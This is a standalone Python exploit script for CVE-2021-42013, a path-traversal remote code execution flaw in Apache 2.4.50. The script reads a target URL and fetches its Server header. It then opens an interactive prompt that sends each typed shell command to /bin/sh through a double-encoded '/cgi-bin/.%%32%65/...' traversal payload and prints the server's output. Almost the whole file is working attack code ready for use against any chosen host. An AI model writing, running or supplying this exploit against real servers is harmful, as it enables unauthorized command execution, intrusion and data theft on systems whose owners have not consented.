#!/usr/bin/env python3

import argparse
import re
import http.client
from typing import Optional, Union


class UrlChecker:
    def __init__(self, url: str) -> None:
        """
        Initialize UrlChecker object.

        Args:
            url (str): The URL to check.
        """
        self.url: str = url

    def extract_domain_or_ip(self) -> Optional[str]:
        """
        Extract domain or IP address from the URL.

        Returns:
            Optional[str]: The extracted domain or IP address, or None if extraction fails.
        """
        try:
            regex: str = r"(https?://)?(?:www\.)?([^\s:/]+|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            match: Optional[re.Match] = re.search(regex, self.url)
            if match:
                return match.group(2)
            return None
        except Exception as e:
            print_error(f"Error occurred during domain extraction: {e}")
            return None

    def check_url(self) -> Optional[str]:
        """
        Check the URL and retrieve the server header.

        Returns:
            Optional[str]: The server header version, or None if check fails.
        """
        try:
            domain_name: Optional[str] = self.extract_domain_or_ip()
            if not domain_name:
                print_error("No valid domain extracted from the URL.")
                return None

            conn: Union[http.client.HTTPConnection, http.client.HTTPSConnection]
            conn = http.client.HTTPSConnection(domain_name) if self.url.startswith(
                "https://") else http.client.HTTPConnection(domain_name)
            conn.request('HEAD', '/')
            response: http.client.HTTPResponse = conn.getresponse()
            conn.close()

            server_header_version: Optional[str] = response.getheader('Server')
            if server_header_version:
                print_info(f"Server header: {server_header_version}")
                return server_header_version
            else:
                print_warning("Server header not found in response.")
                return None

        except http.client.HTTPException as e:
            print_error(f"Error occurred during URL check: {e}")
            return None


class RceExploiter:
    def __init__(self, domain_name: str) -> None:
        """
        Initialize RceExploiter object.

        Args:
            domain_name (str): The domain name or IP address to exploit.
        """
        self.domain_name: str = domain_name

    def exploit_rce(self, rce_command: str) -> None:
        """
        Exploit the Remote Code Execution vulnerability.

        Args:
            rce_command (str): The command to execute.
        """
        try:
            conn: Union[http.client.HTTPConnection, http.client.HTTPSConnection]
            conn = http.client.HTTPSConnection(self.domain_name) if self.domain_name.startswith(
                "https://") else http.client.HTTPConnection(self.domain_name)
            headers: dict = {'Content-Type': 'application/x-www-form-urlencoded'}
            conn.request('POST', '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
                         f'echo Content-Type: text/plain; echo; {rce_command}', headers)
            response: http.client.HTTPResponse = conn.getresponse()

            if response.status == 200:
                print_info("Payload executed successfully:")
                print(response.read().decode('utf-8'))
            else:
                print_warning("Payload execution failed.")
            conn.close()
        except http.client.HTTPException as e:
            print_error(f"Error occurred during payload execution: {e}")


def print_info(message: str) -> None:
    """
    Print an informational message.

    Args:
        message (str): The message to print.
    """
    print(f"[+] {message}")


def print_warning(message: str) -> None:
    """
    Print a warning message.

    Args:
        message (str): The message to print.
    """
    print(f"[!] {message}")


def print_error(message: str) -> None:
    """
    Print an error message.

    Args:
        message (str): The message to print.
    """
    print(f"[-] {message}")


if __name__ == '__main__':
    usage: str = "\n- cve-2021-42013.py -u http://domain.com\n"
    description: str = "CVE-2021-42013.py is a Python script to check and exploit RCE in Apache 2.4.50."

    parser: argparse.ArgumentParser = argparse.ArgumentParser(usage=usage, description=description)
    parser.add_argument("-u", dest="url", type=str, help="Set a target to exploit CVE-2021-42013.")
    args: argparse.Namespace = parser.parse_args()

    if args.url:
        url_checker: UrlChecker = UrlChecker(args.url)
        domain: Optional[str] = url_checker.extract_domain_or_ip()
        if domain:
            print_info(f"Scanning domain: {domain}")
            server_header: Optional[str] = url_checker.check_url()
            rce_exploiter: RceExploiter = RceExploiter(domain)

            while True:
                payload: str = input("[>] Command to run: ")
                if payload.lower() != "exit":
                    rce_exploiter.exploit_rce(payload)
                else:
                    print("Exiting...")
                    break
        else:
            print_error("No valid domain extracted from the URL.")
    else:
        print_error("Set a target url with '-u http://domain.com'.")
